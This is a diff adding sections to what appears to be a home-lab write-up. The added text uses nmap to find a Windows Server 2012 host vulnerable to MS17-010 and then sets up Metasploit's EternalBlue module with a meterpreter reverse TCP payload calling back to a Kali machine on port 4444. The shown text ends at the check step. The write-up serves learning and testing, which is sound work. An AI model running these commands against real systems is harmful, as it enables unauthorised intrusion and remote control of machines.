@@ -36,4 +36,52 @@ This was to scan the network for hosts and to see any open ports and the operati
 
 <img width="1969" height="1119" alt="3" src="https://github.com/user-attachments/assets/b12be7f0-f27a-43f5-8e7b-541dbaabd4c8" />
 
-We discover a Windows Server 2012 machine on the IP 192.168.0.200.
+We discover a Windows Server 2012 machine on the IP '192.168.0.200'. We then performed a command in nmap to check if the Windows Server 2012 machine was vulnerable to the Eternal Blue exploit.
+
+```bash
+sudo nmap -Pn -p 445 --script smb-protocols,smb-vuln-ms17-010 192.168.0.200
+```
+
+Which then showed us that the machine was vulnerable.
+
+<img width="1259" height="907" alt="4" src="https://github.com/user-attachments/assets/7dd5de23-bb83-498a-91b3-7d244b0ec3f6" />
+
+## Eternal Blue Exploitation
+
+After this we Opened Metasploit Framework.
+
+```bash
+msfconsole
+```
+
+And set the exploit as Eternal Blue:
+
+```msfconsole
+use exploit/windows/smb/ms17_010_eternalblue
+```
+
+We then set the following options:
+```msfconsole
+set RHOSTS 192.168.0.200
+set RPORT 445
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST 192.168.0.6
+set LPORT 4444
+```
+So the following options were:
+- RHOSTS as the Vulnerable Windows Server 2012 Machine
+- The RPORT as 445 which is used for smb
+- The payload as the Meterpreter reverse tcp
+- The LHOST as the Kali machine
+- The LPORT as port 4444
+
+```msfconsole
+check
+```
+This command then did one final check to confirm the machine was vulnerable to this exploit.
+
+<img width="1259" height="907" alt="5" src="https://github.com/user-attachments/assets/501eca7a-359a-4bbb-8ad0-fa811301f464" />
+
+
+
+
